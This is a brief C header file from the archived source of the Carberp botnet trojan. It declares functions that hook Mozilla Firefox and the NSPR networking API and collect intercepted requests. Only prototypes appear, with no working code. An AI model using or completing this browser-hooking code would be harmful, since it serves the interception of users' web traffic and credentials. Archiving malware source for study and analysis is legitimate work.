/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
#ifndef FireFoxH
#define FireFoxH
//----------------------------------------------------------------------------

#include "Requests.h"

bool HookMozillaFirefox();



namespace NSPRHOOKS
{
	PRequestList GetRequests();
	bool HookNSPRApi();
}


//----------------------------------------------------------------------------
#endif

